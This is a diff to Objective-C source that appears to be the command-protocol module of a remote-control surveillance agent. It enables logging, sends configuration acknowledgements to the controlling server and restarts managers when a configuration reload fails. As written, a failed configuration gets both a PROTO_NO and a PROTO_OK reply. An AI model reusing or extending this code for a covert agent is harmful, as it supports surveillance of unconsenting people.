@@ -31,10 +31,12 @@
 //#import "RCSMLogger.h"
 //#import "RCSMDebug.h"
 
+#define JSON_CONFIG
+
 //#define DEBUG_PROTO
-//#define infoLog NSLog
-//#define errorLog NSLog
-//#define warnLog NSLog
+#define infoLog NSLog
+#define errorLog NSLog
+#define warnLog NSLog
 
 typedef struct _sync {
   u_int gprsFlag;  // bit 0 = Sync ON - bit 1 = Force
@@ -370,11 +372,9 @@ typedef struct _ApnStruct {
                                             initWithTransport: transport];
             if ([confOP perform] == NO)
               {
-#ifdef DEBUG_PROTO
-                errorLog(@"Error on CONF");
-#endif
+                [confOP sendConfAck:PROTO_NO];
               }
-            
+            [confOP sendConfAck:PROTO_OK];
             [confOP release];
           } break;
         case PROTO_DOWNLOAD:
@@ -562,16 +562,8 @@ typedef struct _ApnStruct {
   
   if (_taskManager.mShouldReloadConfiguration == YES)
     {
-#ifdef DEBUG_PROTO
-      warnLog(@"Loading new configuration");
-#endif
-      [_taskManager reloadConfiguration];
-    }
-  else
-    {
-#ifdef DEBUG_PROTO
-      warnLog(@"No new configuration");
-#endif
+      if ([_taskManager reloadConfiguration] == FALSE)
+        [_taskManager checkManagersAndRestart];
     }
   
   [commandList release];
